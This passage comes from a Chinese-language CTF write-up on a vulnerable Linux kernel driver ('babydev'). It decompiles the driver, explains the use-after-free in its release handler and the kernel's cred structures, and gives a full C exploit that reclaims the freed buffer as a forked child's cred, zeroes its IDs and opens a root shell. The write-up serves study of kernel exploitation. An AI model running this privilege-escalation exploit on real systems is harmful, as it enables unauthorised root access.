+<h4 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  result = <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将device_buf读入到用户指定的buf。</p>
+<h4 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    _fentry__(inode, filp);</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    printk(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>kfree 掉指定的 device_buf，但没有置0，UAF 漏洞。</p>
+<hr>
+<h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><h4 id="了解-thread-info："><a href="#了解-thread-info：" class="headerlink" title="了解 thread_info："></a>了解 thread_info：</h4><p>在用户态二进制 PWN 中，最终目标为通过执行 system 或者 execve 获取 shell。但是在内核 PWN 中，最终的目标是提权。那么应该如何进行提权呢？首先需要了解 Linux 内核的相关机制。在旧版的 Linux 内核当中有个 thread_info 结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span>    <span class="comment">/* 指向主要的任务结构 task_struct */</span></span><br><span class="line">    __u32 flags;                 <span class="comment">/* 低级标志位 */</span></span><br><span class="line">    __u32 status;                <span class="comment">/* 线程同步标志 */</span></span><br><span class="line">    __u32 cpu;                   <span class="comment">/* 当前 CPU 编号 */</span></span><br><span class="line">    <span class="type">mm_segment_t</span> addr_limit;     <span class="comment">/* 地址限制 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> uaccess_err:<span class="number">1</span>;  <span class="comment">/* 用户态访问失败标志 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在该结构体当中有一个 task 指针，指向另一个 task_struct 结构体：</p>
+<h4 id="task-struct："><a href="#task-struct：" class="headerlink" title="task_struct："></a>task_struct：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">        <span class="comment">/* 实际与客观的任务凭证 (COW) */</span></span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span></span><br><span class="line">        <span class="comment">/* 有效的任务凭证 (COW) */</span></span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该结构体描述了进程的所有信息，其中包含了指向权限凭证的指针，而当中有存在 cred 结构体：</p>
+<h4 id="cred-struct："><a href="#cred-struct：" class="headerlink" title="cred_struct："></a>cred_struct：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span> subscribers;</span><br><span class="line">    <span class="type">void</span> *put_addr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> magic;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span> uid;    <span class="comment">/* 进程的实际用户 ID (real UID) */</span></span><br><span class="line">    <span class="type">kgid_t</span> gid;    <span class="comment">/* 进程的实际组 ID (real GID) */</span></span><br><span class="line">    <span class="type">kuid_t</span> suid;   <span class="comment">/* 保存的用户 ID */</span></span><br><span class="line">    <span class="type">kgid_t</span> sgid;   <span class="comment">/* 保存的组 ID */</span></span><br><span class="line">    <span class="type">kuid_t</span> euid;   <span class="comment">/* 有效用户 ID (effective UID) */</span></span><br><span class="line">    <span class="type">kgid_t</span> egid;   <span class="comment">/* 有效组 ID (effective GID) */</span></span><br><span class="line">    <span class="type">kuid_t</span> fsuid;  <span class="comment">/* 用于文件系统的 UID */</span></span><br><span class="line">    <span class="type">kgid_t</span> fsgid;  <span class="comment">/* 用于文件系统的 GID */</span></span><br><span class="line">    <span class="type">unsigned</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable; <span class="comment">/* 可继承的能力 */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;   <span class="comment">/* 允许的能力 */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;   <span class="comment">/* 实际有效的能力 */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;        <span class="comment">/* 能力边界集 */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;     <span class="comment">/* 环境能力集 */</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>cred_struct 用于保存进程的权限信息（如 UID, GID 等）。</p>
+<h4 id="内核获取-thread-info-地址的代码："><a href="#内核获取-thread-info-地址的代码：" class="headerlink" title="内核获取 thread_info 地址的代码："></a>内核获取 thread_info 地址的代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 相关宏定义 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT      12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE       (_AC(1, UL) &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_SIZE     (PAGE_SIZE &lt;&lt; THREAD_SIZE_ORDER)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取 thread_info 地址的内联函数 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> thread_info *<span class="title function_">current_thread_info</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> thread_info *)(current_top_of_stack() - THREAD_SIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此在旧版的内核当中，当一个进程进入内核态以后，在当前栈顶偏移为 0x4000 或 0x8000 的位置（由编译内核时的配置决定），可以获取 thread_info 地址，从而得到 task_struct 的地址，进而得到 cred 的地址。由于在 cred 结构体当中保存着当前进程的权限信息，因此在内核 PWN 当中的最终目标是修改 cred 结构体。</p>
+<hr>
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><p>本题有一个较为简单的方法，由于 cred 结构体的大小事 0xa8，当创建一个新进程时，内核会在堆中申请 0xa8 长度的堆内存放 cred 结构体。因此利用思路如下：</p>
+<p>利用 babyioctl 申请一个 0xa8 字节的堆，赋值给 babydev_struct.buf，再释放，然后创建一个新进程，这样释放的 0xa8 大小的堆会分配给新进程的 cred 结构体。由于 UAF 漏洞，cred 结构体的内容是可控的，只要把控制权限改为 0，即 root 的 UID，就可以使创建的新进程获取到 root 权限，达到提权的目的。</p>
+<hr>
+<h4 id="定义变量："><a href="#定义变量：" class="headerlink" title="定义变量："></a>定义变量：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEV_PATH <span class="string">&quot;/dev/babydev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BABY_IOCTL_ALLOC 0x10001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SIZE 0xa8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPRAY_CHILDREN 128</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DEV_PATH：我们要攻击的设备路径。</li>
+<li>BABY_IOCTL_ALLOC：这就是我们之前分析出触发堆块重新分配的魔法命令号 65537。</li>
+<li>CRED_SIZE：目标内核版本中 cred 结构体的大小。在旧版内核中，当创建一个新进程时，内核会在堆中申请 0xa8 长度的堆存放 cred 结构体。</li>
+<li>SPRAY_CHILDREN：定义将要 fork 多少个子进程。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> fd2 = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>定义一个全局变量 fd2。这是因为后面提权操作是在子进程中调用的函数里执行的，设为全局变量方便直接向这个悬空文件描述符（悬挂指针）写入数据。</p>
+<h4 id="函数辅助区："><a href="#函数辅助区：" class="headerlink" title="函数辅助区："></a>函数辅助区：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>标准的错误处理函数，打印错误信息并直接退出。</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tatic <span class="type">void</span> <span class="title function_">root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] uid is 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    die(<span class="string">&quot;execl&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用 execl(“&#x2F;bin&#x2F;sh”, “sh”, NULL); 替换当前进程镜像，弹出一个 Root Shell。</p>
+<h4 id="UAF-篡改-cred-struct："><a href="#UAF-篡改-cred-struct：" class="headerlink" title="UAF 篡改 cred_struct："></a>UAF 篡改 cred_struct：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">overwrite_cred</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> payload[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    payload[<span class="number">0</span>] = <span class="number">1</span>;                  <span class="comment">/* usage */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">10</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">        payload[i] = <span class="number">0xffffffff</span>;     <span class="comment">/* five kernel_cap_t values */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> n = write(fd2, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> (n != (<span class="type">ssize_t</span>)<span class="keyword">sizeof</span>(payload))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)  <span class="comment">// 检查当前的 UID，如果是 0（Root），则调用 root_shell() 拿 flag。</span></span><br><span class="line">        root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>定义一个大小为 80 字节（20 * 4 字节）的数组，并全部初始化为 0。因为 cred 结构体的前半部分全是各种 ID，只要把 UID、GID 等字段修改为 0（root 的 UID），就能获得 root 权限。</li>
+<li>cred 结构体的第一个成员是 <code>atomic_t usage;</code>（引用计数）。如果这里也被写成了 0，当进程结束时内核去释放这个 cred，会因为引用计数异常引发内核崩溃。所以必须保留它为 1。</li>
+<li>cred 结构体在各种 ID（uid, gid 等）后面，跟着 5 个 kernel_cap_t 类型的特权能力掩码。这里循环把 payload[10] 到 payload[19] 填充为全 1（即十六进制的 0xffffffff），意图是开启进程的所有 Capabilities</li>
+</ul>
+<p><em>由于 <em><code><em>cred</em></code></em> 结构体后面还有 <em><code><em>security</em></code></em>、</em><code><em>user</em></code>_ 等指针。如果把指针也覆盖了，内核一旦解引用就会立刻崩溃。因此，<em><code><em>write</em></code></em> 操作只覆盖前 80 个字节。_</p>
+<ul>
+<li>由于 UAF 漏洞，fd2 指向的那块内存实际上已经被分配给当前进程作为 cred 结构体了。通过 write，我们将精心构造的 payload 直接覆盖在当前进程的 cred 内存上。</li>
+</ul>
+<h4 id="攻击执行流-Main-函数"><a href="#攻击执行流-Main-函数" class="headerlink" title="攻击执行流 -Main 函数"></a>攻击执行流 -Main 函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd1 = open(DEV_PATH, O_RDWR);                 <span class="comment">// process 1</span></span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;open fd1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd2 = open(DEV_PATH, O_RDWR);            </span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;open fd2&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] reallocating babydev buffer to cred-sized slab&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd1, BABY_IOCTL_ALLOC, CRED_SIZE) &lt; <span class="number">0</span>)  <span class="comment">// process 2</span></span><br><span class="line">        die(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing global buffer through fd1&quot;</span>);</span><br><span class="line">    close(fd1);                                       <span class="comment">// process 3</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] forking children to reclaim freed object as cred&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SPRAY_CHILDREN; i++) &#123;        <span class="comment">// process 4</span></span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">            die(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            overwrite_cred();</span><br><span class="line">            _exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 子进程逻辑: 如果当前是子进程，它立刻调用 overwrite_cred() </span></span><br><span class="line"><span class="comment">           尝试通过悬垂指针 fd2 篡改自己的权限。</span></span><br><span class="line"><span class="comment">           如果它刚好是拿到了毒化堆块，提权就会成功。</span></span><br><span class="line"><span class="comment">           如果没有提权成功，调用 _exit(0) 安静退出，以免干扰终端    */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">/* 父进程逻辑: 父进程等待子进程执行完毕，然后再去孵化下一个子进程，</span></span><br><span class="line"><span class="comment">           直到遍历完所有 SPRAY_CHILDREN。                         */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] exploit failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// 如果整个循环跑完了还没弹出 shell，打印失败信息。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><ol>
+<li>打开两次设备。由于驱动程序的缺陷，fd1 和 fd2 在底层共享了同一个全局结构体指针。</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>通过 fd1 调用 ioctl，传入魔法命令 0x10001 和目标大小 0xa8。驱动会分配一块 0xa8 大小的堆，赋值给全局指针 babydev_struct.buf。</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>关闭 fd1。驱动触发 release，释放了这块 0xa8 的内存。但是 fd2 依然认为这块内存是合法的设备缓冲区。UAF 状态成立。</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>循环调用 fork() 创建子进程。因为每当创建一个新进程时，内核就会在堆中申请一块 0xa8 长度的内存存放新进程的 cred 结构体。由于内核 Slab 分配器的后进先出 LIFO 特性，刚才释放的那块 0xa8 内存，极大概率会被分配给其中一个子进程作为 cred。</li>
+</ol>
+</li>
+</ul>
+<h3 id="总-EXP"><a href="#总-EXP" class="headerlink" title="总 EXP:"></a>总 EXP:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEV_PATH <span class="string">&quot;/dev/babydev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BABY_IOCTL_ALLOC 0x10001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SIZE 0xa8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPRAY_CHILDREN 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> fd2 = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] uid is 0&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    die(<span class="string">&quot;execl&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">overwrite_cred</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> payload[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    payload[<span class="number">0</span>] = <span class="number">1</span>;                  <span class="comment">/* usage */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">10</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">        payload[i] = <span class="number">0xffffffff</span>;     <span class="comment">/* five kernel_cap_t values */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> n = write(fd2, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> (n != (<span class="type">ssize_t</span>)<span class="keyword">sizeof</span>(payload))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">        root_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd1 = open(DEV_PATH, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;open fd1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd2 = open(DEV_PATH, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;open fd2&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] reallocating babydev buffer to cred-sized slab&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd1, BABY_IOCTL_ALLOC, CRED_SIZE) &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing global buffer through fd1&quot;</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] forking children to reclaim freed object as cred&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SPRAY_CHILDREN; i++) &#123;</span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">            die(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            overwrite_cred();</span><br><span class="line">            _exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 